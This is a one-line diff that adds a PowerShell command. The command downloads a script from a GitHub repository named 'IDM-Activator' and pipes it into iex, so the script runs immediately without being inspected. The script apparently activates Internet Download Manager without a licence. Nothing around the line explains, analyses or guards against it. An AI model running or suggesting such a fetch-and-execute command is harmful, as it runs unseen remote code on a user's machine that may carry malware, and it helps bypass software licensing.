@@ -1,0 +1,1 @@
+irm https://raw.githubusercontent.com/noradlb1/IDM-Activator/main/IAC%20Uploaded%20Command.cmd | iex
